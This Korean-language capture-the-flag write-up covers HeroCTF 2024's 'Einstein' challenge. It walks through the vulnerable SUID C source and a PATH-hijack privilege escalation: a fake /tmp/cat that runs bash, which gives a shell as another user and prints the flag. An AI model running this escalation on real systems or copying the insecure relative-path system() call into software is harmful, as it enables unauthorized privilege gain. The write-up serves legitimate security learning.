## CTF 정보
- CTF: HeroCTF 2024
- 문제 이름: Einstein
- 점수: 50
- 난이도: very easy

## Description
1. The laws of physics are the same for all observers in any inertial frame of reference relative to one another (principle of relativity).

2. The speed of light in vacuum is the same for all observers, regardless of their relative motion or of the motion of the light source.

Source: https://en.wikipedia.org/wiki/Theory_of_relativity

Credentials: user:password

> Deploy on deploy.heroctf.fr

- Format : Hero{flag}
- Author : Log_s

## Solution
서버로 접속해보면 `learn`, `learn.c` 파일이 있다.

```shell
user@einstein:~$ ls -al 
total 44
drwx------ 1 user     user      4096 Oct 24 17:14 .
drwxr-xr-x 1 root     root      4096 Oct 24 17:14 ..
lrwxrwxrwx 1 root     root         9 Oct 24 17:14 .bash_history -> /dev/null
-rw-r--r-- 1 user     user       220 Oct 24 17:14 .bash_logout
-rw-r--r-- 1 user     user      3526 Oct 24 17:14 .bashrc
-rw-r--r-- 1 user     user       807 Oct 24 17:14 .profile
-rwsr-sr-x 1 einstein einstein 16160 Oct 24 17:14 learn
-rw-r--r-- 1 einstein einstein   679 Oct 24 17:03 learn.c
```

현재 user 계정으로 접속하였는데, `learn`, `learn.c` 파일은 소유자가 `einstein`이다.
`learn` 파일은 SUID 비트가 설정되어 있어서 소유자 권한으로 실행될 때 쉘을 획득할 수 있다.

```c
user@einstein:~$ cat learn.c
#include <stdio.h>
#include <unistd.h>

int main() {
    // Welcome message
    printf("Welcome to this physics course! All information on this course is not copied from the internet without fact check and is completely riginal.\n");
    printf("\n===================================\n\n");
    
    // Execute cat command
    setreuid(geteuid(), geteuid()); // Because system() runs sh that resets euid to uid if they don't match
                                    // Otherwise we could not read /home/einstein/theory.txt
    char command[30] = "cat /home/einstein/theory.txt";
    if (system(command) == -1) {
        perror("system");
        return 1;
    }

    return 0;
}
``` 

`learn.c` 파일을 보면 `system()` 함수를 사용하여 `cat /home/einstein/theory.txt` 명령어를 실행하고 있다.
`/home/einstein/` 하위에 있는 flag를 읽기 위해서는 `setreuid()` 함수를 사용하여 쉘을 획득해야 하는데, 현재 코드에서는 `theory.txt` 파일을 읽고 있다. 실행 중인 바이너리 내부의 command를 변경할 수 없으니 다른 방법을 찾아야 한다.

그런데 `system` 함수에서 `/bin/cat`이 아닌 `cat` 명령어를 실행하고 있어, 환경 변수 조작을 생각해볼 수 있다.

### Exploit Algorithm
```shell
user@einstein:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),100(users)

user@einstein:~$ echo 'bash' > /tmp/cat
user@einstein:~$ chmod +x /tmp/cat
user@einstein:~$ PATH=/tmp:$PATH ./learn
Welcome to this physics course! All information on this course is not copied from the internet without fact check and is completely riginal.

===================================

bash: /home/user/.bashrc: Permission denied

einstein@einstein:~$ id
uid=1001(einstein) gid=1000(user) groups=1000(user),100(users)
```
`/tmp/cat` 파일에 `bash`를 작성하고 실행 권한을 준 뒤, `PATH` 환경 변수에 등록해두면 `cat` 명령어를 실행하였을 때 `/bin/cat` 대신 `/tmp/cat` 명령어를 실행하게 된다. 즉, `learn` 바이너리를 실행하였을 때 `bash` 쉘을 획득할 수 있다.

> 여담으로는 실제로 문제를 풀 때, `tmp`가 아니라 `user` 홈 디렉토리에 `cat` 파일을 만들어서 환경 변수로 추가하는 방법을 사용하였는데 쉘 실행에 있어서 엄청난 메시지를 발생하는지 ssh 접속이 끊어지는 현상이 발생했다..ㅜㅜ

<br>

```shell
einstein@einstein:~$ ls -al /home/einstein
total 36
drwx------ 1 einstein einstein 4096 Oct 24 17:14 .
drwxr-xr-x 1 root     root     4096 Oct 24 17:14 ..
lrwxrwxrwx 1 root     root        9 Oct 24 17:14 .bash_history -> /dev/null
-rw-r--r-- 1 einstein einstein  220 Oct 24 17:14 .bash_logout
-rw-r--r-- 1 einstein einstein 3526 Oct 24 17:14 .bashrc
-rw-r--r-- 1 einstein einstein  807 Oct 24 17:14 .profile
-r-------- 1 einstein einstein   31 Oct 24 17:14 flag.txt
-rw-r--r-- 1 einstein einstein 5440 Oct 24 17:03 theory.txt
```

어쨌든 결과적으로 `einstein` 홈디렉토리에 `flag.txt` 파일이 있었고, 이를 읽을 때에는 `cat`이 아니라 `/bin/cat` 명령어를 사용해야 한다. `cat`은 `bash`를 실행하도록 조작되어 있기 때문이다.

<br>

```shell
einstein@einstein:~$ /bin/cat /home/einstein/flag.txt
Hero{th30ry_of_r3l4tiv3_p4th5}
```

## Flag
`Hero{th30ry_of_r3l4tiv3_p4th5}`